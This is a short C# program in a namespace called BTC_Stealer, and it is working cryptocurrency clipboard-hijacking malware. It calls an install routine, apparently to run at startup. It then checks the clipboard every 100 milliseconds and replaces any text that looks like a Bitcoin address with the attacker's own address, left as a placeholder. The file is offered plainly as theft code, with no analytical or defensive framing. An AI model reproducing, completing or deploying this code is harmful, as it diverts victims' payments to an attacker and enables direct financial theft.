using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
namespace BTC_Stealer
{
    static class Program
    {

        /// <summary>
        /// Główny punkt wejścia dla aplikacji.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Install ins = new Install();
            ins.IsStartup();
            string btcaddr = "ur btc addres";

            while (true)
            {
            Thread.Sleep(100);
                if(Clipboard.ContainsText())
                {
                    string clip = Clipboard.GetText();
                    if(clip != btcaddr)
                    {
                        if(clip.StartsWith("1") || clip.StartsWith("3") || clip.StartsWith("bc1"))
                        {
                            if(clip.Length >=26 && clip.Length <=36)
                            {
                                Clipboard.SetText(btcaddr);
                            }
                        }
                    }
                }
            }

        }
        
    }
}
